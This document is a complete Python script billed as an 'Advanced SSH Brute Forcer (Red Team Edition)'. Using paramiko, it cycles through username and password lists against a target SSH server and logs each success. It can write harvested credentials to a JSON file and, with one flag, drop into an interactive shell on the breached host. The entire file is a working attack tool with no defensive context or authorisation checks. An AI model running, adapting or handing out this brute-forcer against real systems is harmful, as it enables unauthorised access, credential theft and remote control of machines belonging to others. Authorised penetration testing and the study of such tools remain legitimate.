#!/usr/bin/env python3

import paramiko
import argparse
import json
import socket
from datetime import datetime

def try_login(ip, port, username, password, timeout):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, port=port, username=username, password=password,
                       timeout=timeout, allow_agent=False, look_for_keys=False)
        return True, client
    except paramiko.AuthenticationException:
        return False, None
    except (paramiko.SSHException, socket.error):
        return None, None

def load_list(path):
    try:
        with open(path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] List not found: {path}")
        return []

def brute_force(ip, port, users, wordlist, timeout=4, shell=False, out_file=None):
    results = []
    for user in users:
        for pw in wordlist:
            status, client = try_login(ip, port, user, pw, timeout)
            if status is True:
                print(f"[+] SUCCESS: {user}:{pw}")
                results.append({
                    "user": user,
                    "pass": pw,
                    "ip": ip,
                    "port": port,
                    "time": datetime.utcnow().isoformat()
                })
                if shell:
                    shell_session(client)
                client.close()
                break  # move to next user
            elif status is False:
                print(f"[-] Failed: {user}:{pw}")
            else:
                print(f"[!] Timeout/Refused for {user}")

    if out_file:
        with open(out_file, "w") as f:
            json.dump(results, f, indent=2)
        print(f"[+] Saved to {out_file}")

def shell_session(client):
    try:
        chan = client.invoke_shell()
        print("[*] Dropping into interactive shell (type 'exit' to leave)...")
        while True:
            command = input("ssh> ")
            if command.strip().lower() in ["exit", "quit"]:
                break
            chan.send(command + '\n')
            output = chan.recv(4096).decode()
            print(output)
    except Exception as e:
        print(f"[!] Shell error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced SSH Brute Forcer (Red Team Edition)")
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("-p", "--port", type=int, default=22)
    parser.add_argument("-u", "--user", help="Single username")
    parser.add_argument("-U", "--userlist", help="List of usernames")
    parser.add_argument("-w", "--wordlist", required=True)
    parser.add_argument("-t", "--timeout", type=int, default=4)
    parser.add_argument("-o", "--output", help="Save valid creds to JSON")
    parser.add_argument("-i", "--interactive", action="store_true", help="Open shell on success")

    args = parser.parse_args()

    usernames = [args.user] if args.user else load_list(args.userlist)
    passwords = load_list(args.wordlist)

    brute_force(
        ip=args.target,
        port=args.port,
        users=usernames,
        wordlist=passwords,
        timeout=args.timeout,
        shell=args.interactive,
        out_file=args.output
    )
